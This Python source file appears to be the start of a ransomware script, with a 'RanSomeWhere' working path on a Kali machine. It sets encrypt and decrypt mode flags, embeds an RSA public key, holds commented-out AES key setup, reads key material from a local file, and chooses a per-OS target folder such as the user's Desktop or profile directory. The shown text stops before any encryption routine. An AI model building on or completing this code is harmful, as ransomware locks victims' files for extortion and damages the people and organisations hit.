from Crypto.PublicKey import RSA
from pathlib import Path
import platform
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto import Random
from sys import stdout
import base64, os
import rsa, hashlib

# Mode 
encrypt=True
decrypt=False
# Keys
#RSA 
public_key='''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyKphUCe18Eel8L/v0zxm
km3rwSJ+MD5+MmjyPA8RB5ihw7xap78fMS5B7mrp7Eog4m4Ra7RH1sjXOz6t7wQb
VsOFPIfYr7PjoFghdjzKRCmOdwKtY9/1l5rWs2Mli9bGs5IssNtmbFDKJyXUeMZz
LsqokGYZpJMDWPBQuZiIlw/uUj79YpOwEhaT9Iyrg03eqbWvNbIdPXmKzrGpP6Ai
BKcKJ7ufpqi5nYLsVOj4f1MdC17q1uYU18LH0JfzRS/79knqqmKAvIoE/LbVXdKz
4v5ayCaV5WG2qEDJpSdLUGdC9DdIT2VpPBypz6nRhUvl7sonVSkTeUZBKZqpx7fK
XwIDAQAB
-----END PUBLIC KEY-----'''
#AES 
#key = "fc421"
#IV = Random.new().read(16)
#hashed = hashlib.sha256(key.encode('utf-8')).hexdigest()
#hashed=SHA256.new(key.encode('utf-8')).digest()
#print(hashed)
#encryptor=AES.new(hashed,AES.MODE_CBC)
#print(encryptor)
x=open('/home/kali/RanSomeWhere/plain','rb')
key=x.read()
print(key)
OS = platform.system()
if OS == "Linux" or OS == "Darwin":
    p=os.environ['HOME']+'/Desktop/fc421'
elif OS == "Windows":
    p=os.environ['USERPROFILE']
